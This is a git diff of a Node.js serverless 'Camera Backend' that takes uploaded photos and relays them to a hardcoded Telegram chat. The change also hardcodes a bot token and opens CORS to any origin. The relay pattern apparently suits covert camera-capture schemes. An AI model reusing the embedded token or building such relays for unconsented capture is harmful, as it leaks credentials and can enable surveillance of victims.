@@ -1,54 +1,63 @@
-const express = require('express');
-const cors = require('cors');
 const multer = require('multer');
 const axios = require('axios');
 const FormData = require('form-data');
 
-const app = express();
-
-// Middleware
-app.use(cors());
-app.use(express.json());
-
-// Configure multer for memory storage
-const storage = multer.memoryStorage();
-const upload = multer({ storage: storage });
-
-// Environment Variables (Vercel will provide these)
-// Environment Variables (Vercel will provide these)
+// Vars (Hardcoded fallback)
 const BOT_TOKEN = process.env.BOT_TOKEN || '8217603317:AAHbCjswpTeM2YMP-PdnBMZ8xvmfdr2jIug';
 const CHAT_ID = process.env.CHAT_ID || '1603071848';
 
-app.get('/', (req, res) => {
-    res.send('Camera Backend is Running! (V2)');
-});
+// Configure Multer
+const storage = multer.memoryStorage();
+const upload = multer({ storage: storage });
 
-// Match any path starting with /api/upload (or just /api/upload) to be safe
-app.post('*', upload.single('photo'), async (req, res) => {
-    // Basic verification that it's an upload request
-    if (!req.path.includes('upload')) {
-        return res.status(404).send('Not Found');
+// Helper to run middleware
+function runMiddleware(req, res, fn) {
+    return new Promise((resolve, reject) => {
+        fn(req, res, (result) => {
+            if (result instanceof Error) {
+                return reject(result);
+            }
+            return resolve(result);
+        });
+    });
+}
+
+// Main Handler
+module.exports = async function handler(req, res) {
+    // Enable CORS manually
+    res.setHeader('Access-Control-Allow-Credentials', true);
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
+    res.setHeader(
+        'Access-Control-Allow-Headers',
+        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
+    );
+
+    // Handle OPTIONS (Preflight)
+    if (req.method === 'OPTIONS') {
+        res.status(200).end();
+        return;
+    }
+
+    // Only allow POST
+    if (req.method !== 'POST') {
+        return res.status(200).send('Camera Backend is Running! (V3 - Native)');
     }
 
     try {
+        // Run Multer
+        await runMiddleware(req, res, upload.single('photo'));
+
         if (!req.file) {
-            return res.status(400).json({ error: 'No file uploaded (Check body parser config)' });
-        }
-
-        // Use Env Var CHAT_ID by default, or fallback if testing locally with env vars
-        const targetChatId = CHAT_ID;
-
-        if (!targetChatId || !BOT_TOKEN) {
-            console.error('Configuration missing: BOT_TOKEN or CHAT_ID not set.');
-            return res.status(500).json({ error: 'Server configuration error.' });
+            return res.status(400).json({ error: 'No file uploaded' });
         }
 
         console.log('Sending photo to Telegram...');
 
         const form = new FormData();
-        form.append('chat_id', targetChatId);
+        form.append('chat_id', CHAT_ID);
         form.append('photo', req.file.buffer, {
-            filename: 'photo.png',
+            filename: 'photo.jpg',
             contentType: req.file.mimetype,
         });
 
@@ -56,30 +65,21 @@ app.post('*', upload.single('photo'), async (req, res) => {
             `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
             form,
             {
-                headers: {
-                    ...form.getHeaders(),
-                },
+                headers: { ...form.getHeaders() },
             }
         );
 
-        res.status(200).json({ success: true, telegram_data: telegramResponse.data });
+        res.status(200).json({ success: true, telegram: telegramResponse.data.ok });
 
     } catch (error) {
-        console.error('Error sending to Telegram:', error.response ? error.response.data : error.message);
-        const telegramError = error.response && error.response.data
-            ? error.response.data.description
-            : error.message;
-
+        console.error('Error:', error.message);
         res.status(500).json({
-            error: `Telegram Error: ${telegramError}`,
+            error: error.response ? error.response.data.description : error.message
         });
     }
-});
+};
 
-// For Vercel, we export the app, not listen
-module.exports = app;
-
-// IMPORTANT: Disable Vercel's default body parser so Multer can parse the stream
+// Disable Vercel body parser (CRITICAL)
 module.exports.config = {
     api: {
         bodyParser: false,
